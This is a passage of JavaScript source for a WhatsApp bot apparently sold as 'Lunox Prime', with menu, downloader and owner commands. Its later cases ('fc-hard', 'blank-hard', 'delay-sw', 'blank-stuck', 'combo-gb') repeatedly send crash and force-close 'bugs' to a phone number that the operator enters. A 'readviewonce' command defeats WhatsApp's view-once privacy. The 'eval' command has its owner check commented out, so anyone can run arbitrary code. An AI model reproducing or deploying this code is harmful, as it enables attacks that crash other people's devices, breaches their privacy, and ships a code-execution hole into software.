                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹",
                                    url: "https://wa.me/6285183387097?text=*Assalamualaikum%20Pinzy%20Mau%20Buy%20Script%20Lunox%20🙏*"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;

 case "chwa": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U",
                        body: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘐𝘴 𝘏𝘦𝘳𝘦",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                                    url: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;

case "allprodukpinzy": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://t.me/Pinnxyz",
                        body: "*List Product PinzyOfficial*\n- Full Up Otax 60k\n- Reseller Otax 80k\n- Script Lunox Private 50k\n- Partner Pribadi Pinzy 100k",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘦𝘬𝘢𝘳𝘢𝘯𝘨",
                                    url: "https://t.me/Pinnxyz"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;            

 case "chtele": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://t.me/aubotyanz",
                        body: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘐𝘴 𝘏𝘦𝘳𝘦",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                                    url: "https://t.me/aubotyanz"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;             
                        

//BAGIAN CASE MAIN MENU ATAU OWNER                          
case "partnerpinzy": {
const menu = `𝘿𝘼𝙁𝙏𝘼𝙍 𝘼𝙇𝙇 𝙋𝘼𝙍𝙏𝙉𝙀𝙍 𝙋𝙄𝙉𝙕𝙔

𝗡𝗔𝗠𝗘 𝗔𝗟𝗟 :
- Name 1 : Pinzy
- Name 2 : Ikyz
- Name 3 : Skyz
- Name 4 : Radit
- Name 5 : Yanz
- Name 6 : Saka
- Name 7 : LiuLan
- Name 8 : Xyroo Official
- Name 9 : Faris Official
- Name 10 : RidzMods
- Name 11 : Xyzeen

𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗣𝗔𝗥𝗧𝗡𝗘𝗥 :
- Pinzy : t.me/Pinnxyz
- Ikyz : t.me/IkyzBack
- Skyz : t.me/taaqz
- Radit : t.me/Radityaa_m
- Yanz : t.me/yatimss
- Saka : t.me/kanotdevx
- LiuLan : t.me/LiuuLan
- Xyroo Official : t.me/XyrooOffc
- Faris Official : t.me/FriszzOff
- RidzMods : t.me/Faridzz
- Xyzeen : t.me/xyzenreal
> 𝘚𝘦𝘭𝘢𝘪𝘯 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘋𝘪 𝘗𝘢𝘴𝘵𝘪𝘬𝘢𝘯 𝘊𝘭𝘰𝘯𝘦

#𝗡𝗢𝗧𝗘 : Mau Beli Lewat Owner? Tinggal Pilih Mau Order Di Owner Siapa, All Owner Jamin Amanah Yo.
`
client.sendMessage(m.chat, {text: menu}, {quoted: qchanel})
}
break

case "creator": {
const menu = `𝙄𝙉𝙁𝙊 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝙇𝙪𝙣𝙤𝙭𝙋𝙧𝙞𝙢𝙚
- 𝘖𝘵𝘩𝘦𝘳 : PinzyMoods

𝗖𝗢𝗡𝗧𝗔𝗖𝗦 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 :
- Whatsapp : wa.me/6285183387097
- Telegram : t.me/Pinnxyz
- Saluran : t.me/kafours
- Gb Public : t.me/lunoxgbpublic1

➤  ｢ 𝗦𝗔𝗟𝗨𝗥𝗔𝗡 𝗜𝗡𝗙𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗖𝗥𝗜𝗣𝗧 ｣ 
https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U
`
client.sendMessage(m.chat, {text: menu}, {quoted: qchanel})
}
break

case "thanksto":
case "tangankanan-justin": {
const menu = `𝙏𝙀𝙍𝙄𝙈𝘼 𝙆𝘼𝙎𝙄𝙃 𝙆𝙀𝙋𝘼𝘿𝘼 :
- Support 1 : Allah ( 𝗠𝘆 𝗚𝗼𝗼𝗱 )
- Support 2 : Orang tua ( 𝗠𝘆 𝗪𝗶𝗳𝗲 )
- Support 3 : Pinzy ( 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 )
- Support 4 : Yanz ( 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗜 )
- Support 5 : Skyz ( 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗜𝗜 )
- Support 6 : Saka ( 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗜𝗜𝗜 )
- Support 7 : Ikyz ( 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗜 )
- Support 8 : LiuLan ( 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗜𝗜 )
- Support 9 : Faridz ( 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗜𝗜𝗜 )
- Support 10 : 𝗔𝗟𝗟 𝗕𝗨𝗬𝗘𝗥 / 𝗠𝗘𝗠𝗕𝗘𝗥 𝗟𝗨𝗡𝗢𝗫
`
client.sendMessage(m.chat, {text: menu}, {quoted: fquoted.channel})
}
break

            case "tt":
            case "tiktok": {
                if (!text) return reply(config.message.ex + prefix + command + " url tiktok")
                const tiktokRegex = /(https?:\/\/)?(www\.)?(vm|vt|m|www)?\.?tiktok\.com\/[^\s]+/i;
                if (!tiktokRegex.test(text)) return reply("URL TikTok tidak valid")
                const api = await fetch(`https://api.nekolabs.web.id/downloader/tiktok?url=${encodeURIComponent(text)}`);
                const res = await api.json();
                const data = res.result;
                return await client.sendMessage(m.chat, {
                    video: { url: data.videoUrl },
                    caption: data.title
                }, { quoted: fquoted.channel });
            }
            break      
               
case 'tourl': {
                
                if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}`);
                let pnis = await m.quoted ? m.quoted : m;
                let media = await pnis.download();
                let link = await TelegraPh(media);
                await sleep(1000);
                await m.reply(`${link}`);
            }
            break

case 'cc': case 'capcut': {
	
function download(url) {
  return new Promise(async(resolve, reject) => {
    try {
      let cc = await axios.get(url, {
        headers: {
          'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
      }).then(x => x.data)
      
      let dataMatch = /<script nonce="argus-csp-token">window\._ROUTER_DATA = (.*?)<\/script>/;
      if (cc.match(dataMatch)) {
        let getJson = JSON.parse(cc.match(dataMatch)[1]).loaderData['template-detail_$'].templateDetail
        if (getJson.templateId) {
          resolve({ status: true, mess: `Berhasil mengambil data`, data: getJson })
        } else {
          resolve({ status: false, mess: `Tidak ada metadata tersedia`})
        }
      }
    } catch(e) {
      reject({ status: false, mess: `Gagal mengambil metadata`})
    }
  })
}

if (!text.includes('www.capcut.net')) return m.reply('Masukin link Capcut Dongo 😹')
let hasil = await download(text)

try {

let clientCcDnL = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴄᴄ ]* ── .々─ᯤ\n`
clientCcDnL += `│    =〆 ᴛɪᴛʟᴇ: ${hasil.data.title}\n`
clientCcDnL += `│    =〆 ᴅᴇsᴄ: ${hasil.data.desc}\n`
clientCcDnL += `│    =〆 ɪᴅ: ${hasil.data.templateId}\n`
clientCcDnL += `│    =〆 ᴜʀʟ: ${hasil.data.structuredData.url}\n`
clientCcDnL += `⏤͟͟͞͞╳────────── .✦`

await client.sendMessage(m.chat, { video: { url: hasil.data.videoUrl }, caption: clientCcDnL }, { quoted: m })

} catch (e) {
 m.reply('Yah Error Jir')
}

}
break

case "cekidch": {
if (!text) return m.reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
m.reply(teks)
}
break;
                             
             case "self":{
                        await reaction(m.chat, "⏳")
             await sleep(2500);
             await reaction(m.chat, "✅")
                if (!isOwner) return reply("`Kusus Owner`") 
                client.public = false
                reply(`successfully changed to ${command}`)
            }
            break;           
                        case "public":{
                        await reaction(m.chat, "⏳")
             await sleep(2500);
             await reaction(m.chat, "✅")
                if (!isOwner) return reply("`Kusus Owner`") 
                client.public = true
                reply(`successfully changed to ${command}`)
            }
            break;                         
                
            case "mesinfo": {
                if (!m.quoted) return reply("harap reply ke sebuah pesan untuk mengecek mtype dan id-nya.");
             
                const type = m.quoted.mtype;
                const id = m.quoted.id;
                reply(`Pesan yang di-reply memiliki:\n- Tipe pesan: *${type}*\n- ID pesan: *${id}*`);
            }
            break;

case "sbrat":
case "brat": {
                if (!text) return reply(config.message.ex + prefix + command + " hai")
                
                let yes = "https://brat.siputzx.my.id/image?text=" + encodeURIComponent(text) + "&background=%23ffffff&color=%23000000&emojiStyle=apple"
                return client.sendImageAsSticker(m.chat, yes, m, { 
                    packname: config.settings.packname,
                    author: config.settings.author 
                })
            }
            break
            
case "swgroup":
case "swgrup":
case "swgc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    m.react("✅️")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    m.react("✅️")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    m.react("✅️")
                } else if (caption) {
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    m.react("✅️")
                } else {
                    await reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai`);
                }
            }
            break;
            case "get":{
                if (!isOwner) return reply(config.message.owner)
             //   if (!isBot) return
                if (!/^https?:\/\//.test(text)) return reply(`*ex:* ${prefix + command} https://kyuurzy.site`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⏳")
                await sleep(2500);
                await await reaction(m.chat, "✅")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return client.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: fquoted.channel });
                }
        
                if (contentType.startsWith("video/")) {
                    return client.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: fquoted.channel });
                }
                
                if (contentType.startsWith("audio/")) {
                    return client.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: fquoted.channel });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break
            case "insp": {
                if (!isOwner) return reply(config.message.owner)
          //      if (!isBot) return
                if (!text && !m.quoted) return reply(`*reply:* ${prefix + command}`);
                let quotedType = m.quoted?.mtype || '';
                let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2);
                const acak = `insp-${crypto.randomBytes(6).toString('hex')}.json`;
                
                await client.sendMessage(m.chat, {
                    document: Buffer.from(penis),
                    fileName: acak,
                    mimetype: "application/json"
                }, { quoted: fquoted.channel })
            }
            break
            case 'tagall':{
                if (!isOwner) return reply(config.message.owner)
         //       if (!isBot) return
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await client.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                client.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: fquoted.channel });
            }
            break
            case "exec": {
                if (!isOwner) return reply(config.message.owner)
            //    if (!isBot) return;
                if (!budy.startsWith(".exec")) return;
                
                const { exec } = require("child_process");
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} ls`);
                exec(args, (err, stdout) => {
                    if (err) return reply(String(err));
                    if (stdout) return reply(stdout);
                });
            }
            break;
            case "eval": {
            //    if (!isOwner) return reply(config.message.owner)
            //    if (!isBot) return;
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await reply(require('util').format(teks));
                }
            }
            break;
                
            case 'addown':
            case 'addowner': {
                if (!isOwner) return reply(config.message.owner)
                if (!q) return reply(`— ex: ${prefix + command} 62`);
                
                let bijipler = q.replace(/[^0-9]/g, "")
                if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                let add = bijipler + '@s.whatsapp.net'
                
                let capt = `anda kini telah mendapatkan akses owner ke bot`
                kontributor.push(bijipler)
                fs.writeFileSync(path.resolve(__dirname, './Lunox-Prime/lib/database/owner.json'), JSON.stringify(kontributor), 'utf8')
                reply("berhasil menambahkan ke daftar owner")
                await reaction(m.chat, "⏳")
            await sleep(2500);
            await reaction(m.chat, "✅")
                await sleep(5000)
                m.reply(capt, add)
            }
            break
            case 'dellown':
            case 'dellowner':
            case 'delowner':{
                if (!isOwner) return reply(config.message.owner)
                if (!q) return reply(`— ex: ${prefix + command} 62`);
            
                let bijipler = q.replace(/[^0-9]/g,"")
                if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                let index = kontributor.indexOf(bijipler)
                if (index>-1) {
                    kontributor.splice(index,1)
                    fs.writeFileSync(path.resolve(__dirname,'./Lunox-Prime/lib/database/owner.json'),JSON.stringify(kontributor),'utf8')
                    reply("owner berhasil dihapus")
                    await reaction(m.chat, "⏳")
            await sleep(3500);
            await reaction(m.chat, "✅")
                } else {
                    reply("nomor tidak ditemukan dalam daftar owner")
                }
            }
            break

case 'iqc': {
 try {
 if (!text) {
 return Reply('Format salah! Gunakan: .iqc jam|batre|pesan\nContoh: .iqc 18:00|40|hai hai');
 }

 const parts = text.split('|');
 if (parts.length < 3) {
 return Reply('Format salah! Gunakan:\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai');
 }

 const [time, battery, ...messageParts] = parts;
 const message = messageParts.join('|').trim();

 if (!time || !battery || !message) {
 return Reply('Format tidak lengkap! Pastikan mengisi jam, batre, dan pesan');
 }

 await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 const encodedTime = encodeURIComponent(time);
 const encodedMessage = encodeURIComponent(message);
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodedMessage}&emojiStyle=apple`;

 const response = await axios.get(url, { responseType: 'arraybuffer' });

 if (!response.data) {
 throw new Error('Gagal mendapatkan gambar dari server');
 }

 await client.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '𝘗𝘰𝘸𝘦𝘳𝘥 𝘉𝘺 𝘗𝘪𝘯𝘻𝘺 | 𝘓𝘶𝘯𝘰𝘹'
 }, { quoted: m });

 await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

 } catch (error) {
 console.error('Error di iqc:', error);
 Reply(`❌ Error: ${error.message || 'Terjadi kesalahan saat memproses'}`);
 }
}
break;

case 'rvo':
case 'readviewonce': {
  await reaction(m.chat, "⏳")

  const msg = m.quoted;
  if (!msg) return reply('⚠️ Harap reply ke pesan media view once-nya.');

  // deteksi tipe pesan
  let type = msg.mtype;

  // kalau view once, buka isi dalamnya
  if (type === 'viewOnceMessageV2' || type === 'viewOnceMessage') {
    const inner = msg.msg || msg.message;
    if (inner?.imageMessage) {
      type = 'imageMessage';
      msg.msg = inner;
    } else if (inner?.videoMessage) {
      type = 'videoMessage';
      msg.msg = inner;
    } else if (inner?.audioMessage) {
      type = 'audioMessage';
      msg.msg = inner;
    }
  }

  const kind =
    type === 'imageMessage' ? 'image' :
    type === 'videoMessage' ? 'video' :
    type === 'audioMessage' ? 'audio' : null;

  if (!kind) return reply('❌ Jenis pesan tidak didukung. Gunakan hanya untuk gambar, video, atau audio.');

  // ===== Helper =====
  const pad = (n) => n.toString().padStart(2, '0');
  const formatBytes = (n) => {
    if (!n && n !== 0) return '-';
    const units = ['B','KB','MB','GB','TB'];
    let i = 0, v = Number(n);
    while (v >= 1024 && i < units.length - 1) { v /= 1024; i++; }
    return `${v.toFixed(v >= 10 ? 0 : 1)} ${units[i]}`;
  };
  const formatDuration = (sec) => {
    if (!sec && sec !== 0) return '-';
    const h = Math.floor(sec / 3600);
    const mnt = Math.floor((sec % 3600) / 60);
    const s = Math.floor(sec % 60);
    return h ? `${h}:${pad(mnt)}:${pad(s)}` : `${mnt}:${pad(s)}`;
  };
  const formatDateID = (d = new Date()) => {
    const opts = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
                   hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Jakarta' };
    return new Intl.DateTimeFormat('id-ID', opts).format(d) + ' WIB';
  };
  const safe = (v) => (v === undefined || v === null || v === '' ? '-' : String(v));

  // ambil metadata grup
  let groupMeta = null;
  let groupLine = 'Private Chat';
  try {
    if (m.isGroup) {
      groupMeta = await client.groupMetadata(m.chat);
      groupLine = `${safe(groupMeta.subject)} (${groupMeta.participants?.length || 0} member)`;
    }
  } catch {}

  const senderJid = msg?.sender || msg?.key?.participant || m?.sender || '-';
  const senderName = msg?.pushName || m?.pushName || senderJid?.split('@')[0] || '-';

  // ambil properti media
  const im = msg?.msg?.imageMessage;
  const vm = msg?.msg?.videoMessage;
  const am = msg?.msg?.audioMessage;
  const base = (kind === 'image' ? im : kind === 'video' ? vm : am) || {};

  const mime = base.mimetype || '-';
  const size = base.fileLength || base.fileLengthLow || base.mediaKeyTimestamp || null;
  const seconds = base.seconds || base.pttDuration || base.audioLength || null;
  const width  = base.width  || base.jpegThumbnailWidth  || null;
  const height = base.height || base.jpegThumbnailHeight || null;
  const sha256 = base?.fileSha256 ? Buffer.from(base.fileSha256, 'base64').toString('hex') : null;

  try {
    // download ulang media
    const stream = await downloadContentFromMessage(msg, kind);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const captionOri = msg.caption || '';
    const lines = [
      '𝘗𝘰𝘸𝘦𝘳𝘥 𝘉𝘺 𝘗𝘐𝘕𝘡𝘠 | 𝘓𝘜𝘕𝘖𝘟',
    ];
    const detailCaption = lines.join('\n');

    // kirim media + caption detail
    const sendOptions = { quoted: m };
    if (kind === 'image') {
      await client.sendMessage(m.chat, { image: buffer, caption: detailCaption }, sendOptions);
    } else if (kind === 'video') {
      await client.sendMessage(m.chat, { video: buffer, caption: detailCaption }, sendOptions);
    } else if (kind === 'audio') {
      await client.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg', ptt: true, caption: detailCaption }, sendOptions);
    }
    
    await reaction(m.chat, "✅");
    return reply(`Type : *${kind.toUpperCase()}*\nViewOnce Berhasil Diproses.`);
  } catch (err) {
    console.error('rvo-safe error:', err);
    return reply('❌ Gagal memproses media. Coba lagi atau kirim ulang tanpa kompresi.');
  }
}
break;

case 'report': {
  await reaction(m.chat, "⏳");

  let teks = `📢 *LAPORAN FITUR ERROR*\n\n`
  teks += `👤 *Pelapor:* $@${m.sender.split('@')[0]}\n`
  teks += `💬 *Pesan:* ${text}\n`
  teks += `📅 *Waktu:* ${new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })}`

await client.sendMessage(config.owner, {
  text: teks,
  mentions: [m.sender]
}, { quoted: m })
  reply('✅ sudah dikirim ke owner. Terima kasih!')
}
break

case "afk": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = true
await reaction(m.chat, "✅")
m.reply('*Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Owner Offline*')
}
break;

case "unafk": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = false
await reaction(m.chat, "✅")
m.reply('*Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Owner Online*')
}
break;
//CASE CRASH ONE MESSAGE
case 'fc-hard':
case 'forclose-call': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 3; i++) {
await forcloselunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : fc calling"))
            }
            break;

//CASE FORCE ONE MESSAGE
case 'blank-hard': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 3; i++) {
await blankhardlunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : blank hard"))
            }
            break;
            
                            
//CASE BUG FC QUIZ
case 'delay-sw': {
if (!isOwner) return reply(config.message.owner); 
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 5; i++) {
await delayhardlunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : delay sw hard"))
            }
            break;                         
                                
//CASE BUG CRASH SPAM
case 'blank-stuck': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 8; i++) {
await blankhardlunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : blank stuck logo"))
            }
            break;            
                                                      
//CASE BUG GRUP FC           		
case 'combo-gb': {
    await reaction(m.chat, "🕛")
    await sleep(1000);
    await reaction(m.chat, "🕞")
    await sleep(1000);
    await reaction(m.chat, "🕖")
    await sleep(1000);
    await reaction(m.chat, "🕛")
